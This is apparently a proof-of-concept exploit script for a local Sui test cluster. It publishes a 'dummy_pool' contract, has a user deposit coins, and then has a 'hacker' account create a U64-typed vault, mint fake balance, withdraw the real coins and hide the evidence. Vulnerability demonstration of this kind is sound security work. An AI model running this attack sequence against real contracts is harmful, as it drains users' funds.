let effect @ { Eff, ? } = import! std.effect
let { Lift, run_lift, lift, ? } = import! std.effect.lift
let { wrap } = import! std.applicative
let { Reporting } = import! lancer.reporting
let { ObjectRef, ObjectArg, ? } = import! lancer.transaction.builder.types
let { find_map } = import! std.foldable
let { unwrap } = import! std.option
let array @ { is_empty } = import! std.array
let { (<|), (<<) } = import! std.function
let { TransactionBlockResponse, ObjectChange, ? } = import! lancer.rpc.types
let { TypeTag, StructTag, ? } = import! lancer.sui.types
let { SuiAddress, ? } = import! lancer.sui.sui_address
let { unwrap_ok, ? } = import! std.result
let { parse } = import! lancer.parse
let { assert } = import! std.assert

let {
    TestCluster,
    generate_keypair,
    execute_tx,
    get_coins,
    get_balance,
    commit_preparation,
    commit_demonstration,
} = import! lancer.effect.test_cluster

let {
    compile_directory,
} = import! lancer.effect.compiler

let {
    u8,
    u16,
    u32,
    u64,
    bool,
    address,
    object_ref,
    publish_upgradeable,
    publish_immutable,
    move_call,
    pay,
} = import! lancer.effect.transaction_builder
let { Logger, log, ? } = import! lancer.effect.logger

log "Generating admin keypair"
do admin = generate_keypair

log "Publishing the main contract"
do r = execute_tx 500000000 admin (
    publish_immutable <| compile_directory "dummy_pool"
)

let package_id = unwrap (find_map (\x ->
    match x with
    | Published { package_id, ? } -> Some package_id
    | _ -> None) r.object_changes)

let (state_id, state_version) = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "DummyPool",
            type_params,
        }, ? } ->
            if address == package_id && is_empty type_params then
                Some (object_id, version)
            else None
    | _ -> None) r.object_changes)

log <| "Package ID: " ++ show package_id ++ ", State ID: " ++ show state_id

let some_coin_struct: StructTag = {
    address = package_id,
    module = "some_coin",
    name = "SOME_COIN",
    type_params = [],
}

let some_coin_type: TypeTag = Struct some_coin_struct

let dummy_pool_coin_struct: StructTag = {
    address = package_id,
    module = "dummy_pool",
    name = "DUMMY_POOL",
    type_params = [],
}

let dummy_pool_coin_type: TypeTag = Struct dummy_pool_coin_struct

let sui_framework = unwrap_ok (parse "0x0000000000000000000000000000000000000000000000000000000000000002")

let some_coin_object_ref: ObjectRef = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "coin",
            name = "Coin",
            type_params,
        }, ? } -> if address == sui_framework && type_params == [some_coin_type] then Some (object_id, version, digest) else None
    | _ -> None) r.object_changes)

log <| "Creating pool"

do r = execute_tx 500000000 admin (
    do state_arg = object_ref <| SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    }
    do price = u64 10000
    move_call package_id "dummy_pool" "create_vault" [ some_coin_type ] [
        state_arg,
        price
    ]
)

let (vault_id, vault_version) = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "Vault",
            type_params,
        }, ? } ->
            if address == package_id && type_params == [some_coin_type] then
                Some (object_id, version)
            else None
    | _ -> None) r.object_changes)

log <| "Vault ID: " ++ show vault_id

log <| "Generating user keypair"
do user = generate_keypair

log <| "Sending some coins to user"

do r = execute_tx 500000000 admin (
    pay [some_coin_object_ref] [10000000] [user]
)

do coins = get_coins some_coin_struct user
let _ = assert(array.len coins == 1)
let coin = array.index coins 0

log <| "Depositing some coins into the pool"

do r = execute_tx 500000000 user (
    do state_arg = object_ref <| SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    }
    do vault_arg = object_ref (SharedObject {
        id = vault_id,
        initial_shared_version = vault_version,
        mutable = True,
    })
    do coin_arg = object_ref (ImmOrOwnedObject (coin.coin_object_id, coin.version, coin.digest))
    move_call package_id "dummy_pool" "deposit" [ some_coin_type ] [
        state_arg,
        vault_arg,
        coin_arg
    ]
)

commit_preparation []

log <| "Generating hacker keypair"
do hacker = generate_keypair

log <| "Creating a hacker's vault"

do r = execute_tx 500000000 hacker (
    do state_arg = object_ref <| SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    }
    do price = u64 10000
    move_call package_id "dummy_pool" "create_vault" [ U64 ] [
        state_arg,
        price
    ]
)

let (hacker_vault_id, hacker_vault_version) = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "Vault",
            type_params,
        }, ? } ->
            if address == package_id && type_params == [U64] then
                Some (object_id, version)
            else None
    | _ -> None) r.object_changes)

log <| "Hacker's Vault ID: " ++ show hacker_vault_id

let hacker_admin_cap_ref = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "VaultAdminCap",
            type_params,
        }, ? } ->
            if address == package_id && type_params == [U64] then
                Some (object_id, version, digest)
            else None
    | _ -> None) r.object_changes)

log <| "Hide admin cap from the public view"
do r = execute_tx 500000000 hacker (
    do hacker_admin_cap_arg = object_ref <| ImmOrOwnedObject hacker_admin_cap_ref
    move_call sui_framework "transfer" "public_freeze_object" [Struct { 
        address = package_id,
        module = "dummy_pool",
        name = "VaultAdminCap",
        type_params = [U64],
    }] [
        hacker_admin_cap_arg,
    ]
)

log <| "Executing stealing funds"

do r = execute_tx 500000000 hacker (
    do otw = u64 0
    do supply_arg = move_call sui_framework "balance" "create_supply" [U64] [otw]
    do value = u64 10000000
    do balance_arg = move_call sui_framework "balance" "increase_supply" [U64] [
        supply_arg,
        value
    ]
    do state_arg = object_ref <| SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    }
    do hacker_vault_arg = object_ref <| SharedObject {
        id = hacker_vault_id,
        initial_shared_version = hacker_vault_version,
        mutable = True,
    }
    do lst_arg = move_call package_id "dummy_pool" "deposit_balance" [U64] [
        state_arg,
        hacker_vault_arg,
        balance_arg
    ]
    do vault_arg = object_ref <| SharedObject {
        id = vault_id,
        initial_shared_version = vault_version,
        mutable = True,
    }
    do goods_arg = move_call package_id "dummy_pool" "withdraw_balance" [ some_coin_type ] [
        state_arg,
        vault_arg,
        lst_arg
    ]
    do goods_arg = move_call sui_framework "coin" "from_balance" [some_coin_type] [goods_arg]
    do target = address hacker
    move_call sui_framework "transfer" "public_transfer" [Struct {
        address = sui_framework,
        module = "coin",
        name = "Coin",
        type_params = [some_coin_type],
    }] [
        goods_arg,
        target,
    ]

    // Hide dummy balance into the frozen versioned struct
    let supply_type: TypeTag = Struct {
        address = sui_framework,
        module = "balance",
        name = "Supply",
        type_params = [U64],
    }
    do version = u64 0
    do versioned_arg = move_call sui_framework "versioned" "create" [supply_type] [
        version,
        supply_arg
    ]
    move_call sui_framework "transfer" "public_freeze_object" [Struct {
        address = sui_framework,
        module = "versioned",
        name = "Versioned",
        type_params = [],
    }] [
        versioned_arg,
    ]
)

do balance = get_balance some_coin_struct hacker
let _ = assert(balance > 0)

let description = "Now hacker " ++ show hacker ++ " has " ++ show balance ++ " some coins stolen from the protocol"

commit_demonstration description <| Partial { owned_by = [hacker], objects = [] }